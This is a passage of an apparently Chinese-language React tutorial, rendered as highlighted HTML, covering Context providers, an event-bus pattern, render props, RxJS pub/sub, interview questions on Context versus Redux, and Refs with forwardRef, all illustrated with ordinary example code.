class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">LayoutContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;layout&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AppContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">LayoutContext.Provider</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// 消费时自动匹配最近Provider</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);       <span class="hljs-comment">// 获取user</span><br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);     <span class="hljs-comment">// 获取theme</span><br>  <span class="hljs-keyword">const</span> layout = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">LayoutContext</span>);   <span class="hljs-comment">// 获取layout</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="事件总线（Event-Bus）模式"><a href="#事件总线（Event-Bus）模式" class="headerlink" title="事件总线（Event Bus）模式"></a>事件总线（Event Bus）模式</h3><p><strong>实现原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// eventBus.js</span><br><span class="hljs-keyword">const</span> events = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  $on(eventName, fn) &#123;<br>    events[eventName] = events[eventName] || [];<br>    events[eventName].<span class="hljs-title function_">push</span>(fn);<br>  &#125;,<br>  <br>  $off(eventName, fn) &#123;<br>    <span class="hljs-keyword">if</span> (events[eventName]) &#123;<br>      events[eventName] = events[eventName].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f !== fn);<br>    &#125;<br>  &#125;,<br>  <br>  $emit(eventName, data) &#123;<br>    <span class="hljs-keyword">if</span> (events[eventName]) &#123;<br>      events[eventName].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>(data));<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>React 组件中使用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 组件A（发布事件）</span><br><span class="hljs-keyword">import</span> eventBus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./eventBus&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    eventBus.$emit(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;数据内容&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>发送<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 组件B（订阅事件）</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [msg, setMsg] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">data</span>) =&gt; <span class="hljs-title function_">setMsg</span>(data);<br>    eventBus.$on(<span class="hljs-string">&#x27;message&#x27;</span>, handler);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> eventBus.$off(<span class="hljs-string">&#x27;message&#x27;</span>, handler); <span class="hljs-comment">// 清理</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>适用场景与风险</strong></p><table><thead><tr><th align="left">优点</th><th align="left">缺点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">跨任意组件通信</td><td align="left">破坏组件独立性</td><td align="left">微前端架构通信</td></tr><tr><td align="left">解耦性强</td><td align="left">难以追踪数据流</td><td align="left">非父子组件简单交互</td></tr><tr><td align="left">实现简单</td><td align="left">可能内存泄漏（未及时取消订阅）</td><td align="left">第三方库事件通知</td></tr></tbody></table><h3 id="高级通信模式"><a href="#高级通信模式" class="headerlink" title="高级通信模式"></a>高级通信模式</h3><p><strong>状态提升 + Context 组合</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建共享状态上下文</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SharedStateContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SharedStateContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">state</span>, <span class="hljs-attr">setState</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SharedStateContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 任意子组件消费</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; state, setState &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">SharedStateContext</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Render Props 模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 数据提供者</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetchData</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data &#125;));<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">children</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">data</span>); <span class="hljs-comment">// 关键</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 消费组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Consumer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span>&gt;</span></span><br><span class="language-xml">      &#123;data =&gt; data ? <span class="hljs-tag">&lt;<span class="hljs-name">ShowData</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Loading</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataProvider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>观察者模式（Pub&#x2F;Sub）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用第三方库 (rxjs)</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Subject</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;rxjs&#x27;</span>;<br><br><span class="hljs-keyword">const</span> message$ = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br><br><span class="hljs-comment">// 发布</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">publishMessage</span>(<span class="hljs-params">text</span>) &#123;<br>  message$.<span class="hljs-title function_">next</span>(text);<br>&#125;<br><br><span class="hljs-comment">// 订阅</span><br>message$.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;收到消息:&#x27;</span>, text);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-4"><a href="#高频面试题与破解方案-4" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q:：Context 与 Redux 如何选择？</strong></p><pre class="mermaid">graph TDA[需要全局状态?] -->|是| B[状态更新频率高?]A -->|否| C[用Props/状态提升]B -->|是| D[用Redux/Zustand]B -->|否| E[用Context API]</pre><p>关键区别：</p><ul><li>Context：轻量级，适合低频更新（主题&#x2F;用户信息）</li><li>Redux：重量级，适合高频更新+时间旅行调试</li></ul><p><strong>Q：如何避免 Context 性能问题？</strong></p><ul><li>拆分 Context：按业务分离（用户Context&#x2F;主题Context）</li><li>使用 React.memo：防止无关组件重渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; nonContextProp &#125;</span>) =&gt;</span> &#123; ... &#125;);<br></code></pre></td></tr></table></figure><ul><li>选择订阅：使用 use-context-selector 库</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useContextSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;use-context-selector&#x27;</span>;<br><span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContextSelector</span>(<span class="hljs-title class_">ThemeContext</span>, <span class="hljs-function"><span class="hljs-params">ctx</span> =&gt;</span> ctx.<span class="hljs-property">theme</span>);<br></code></pre></td></tr></table></figure><p><strong>Q：事件总线会导致什么问题？</strong></p><ul><li>内存泄漏：组件卸载时取消订阅</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;;<br>  bus.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, handler);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> bus.<span class="hljs-title function_">off</span>(<span class="hljs-string">&#x27;event&#x27;</span>, handler); <span class="hljs-comment">// ✅</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><ul><li>事件冲突：使用命名空间</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;moduleA:event&#x27;</span>, data);<br></code></pre></td></tr></table></figure><ul><li>调试困难：添加事件日志</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">event, data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Event] <span class="hljs-subst">$&#123;event&#125;</span>`</span>, data);<br>  <span class="hljs-comment">// ...原逻辑</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-Refs-使用场景（DOM-操作、forwardRef）"><a href="#2-5-Refs-使用场景（DOM-操作、forwardRef）" class="headerlink" title="2.5 Refs 使用场景（DOM 操作、forwardRef）"></a>2.5 Refs 使用场景（DOM 操作、forwardRef）</h2><h3 id="Refs-核心概念全景图"><a href="#Refs-核心概念全景图" class="headerlink" title="Refs 核心概念全景图"></a>Refs 核心概念全景图</h3><pre class="mermaid">graph TD  A[Refs 类型] --> B[对象 Ref]  A --> C[回调 Ref]  A --> D[函数组件 useRef]    E[使用场景] --> F[访问 DOM 节点]  E --> G[访问类组件实例]  E --> H[存储可变值]  E --> I[集成第三方库]    J[高级特性] --> K[forwardRef 转发]  J --> L[useImperativeHandle 暴露方法]</pre><h3 id="三大-Refs-创建方式"><a href="#三大-Refs-创建方式" class="headerlink" title="三大 Refs 创建方式"></a>三大 Refs 创建方式</h3><p><strong>对象 Ref（类组件）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoFocusInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  inputRef = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createRef</span>();  <span class="hljs-comment">// 创建 Ref 对象</span><br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">inputRef</span>.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// 访问 DOM 节点</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.inputRef&#125;</span> /&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>回调 Ref（动态场景）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicRef</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  setRef = <span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (element) &#123;<br>      element.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// 元素挂载时执行</span><br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.setRef&#125;</span> /&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>useRef Hook（函数组件）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FocusInput</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// 创建 Ref</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// 挂载后聚焦</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="核心使用场景深度解析"><a href="#核心使用场景深度解析" class="headerlink" title="核心使用场景深度解析"></a>核心使用场景深度解析</h3><p><strong>DOM 操作（核心场景）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">VideoPlayer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> videoRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">play</span> = (<span class="hljs-params"></span>) =&gt; videoRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">play</span>();<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">pause</span> = (<span class="hljs-params"></span>) =&gt; videoRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">pause</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;videoRef&#125;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;play&#125;</span>&gt;</span>播放<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;pause&#125;</span>&gt;</span>暂停<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>存储可变值（不触发重渲染）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Timer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">const</span> intervalRef = <span class="hljs-title function_">useRef</span>();  <span class="hljs-comment">// 存储计时器 ID</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    intervalRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(intervalRef.<span class="hljs-property">current</span>);<br>  &#125;, []);<br>  <br>  <span class="hljs-comment">// 停止计时器（不依赖 state）</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">stop</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-built_in">clearInterval</span>(intervalRef.<span class="hljs-property">current</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;count&#125; <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;stop&#125;</span>&gt;</span>停止<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类组件方法调用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 子组件（类组件）</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioPlayer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  play = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">audio</span>.<span class="hljs-title function_">play</span>();<br>  pause = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">audio</span>.<span class="hljs-title function_">pause</span>();<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;el</span> =&gt;</span> this.audio = el&#125; /&gt;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> playerRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AudioPlayer</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;playerRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> playerRef.current.play()&#125;&gt;播放<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三方库集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChartContainer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> chartRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> chartInstance = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 初始化图表</span><br>    chartInstance.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThirdPartyChart</span>(chartRef.<span class="hljs-property">current</span>, data);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> chartInstance.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>();  <span class="hljs-comment">// 清理</span><br>  &#125;, [data]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;chartRef&#125;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> &#x27;<span class="hljs-attr">400px</span>&#x27; &#125;&#125; /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="forwardRef-转发机制"><a href="#forwardRef-转发机制" class="headerlink" title="forwardRef 转发机制"></a>forwardRef 转发机制</h3><p><strong>问题背景：函数组件不能直接使用 ref</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 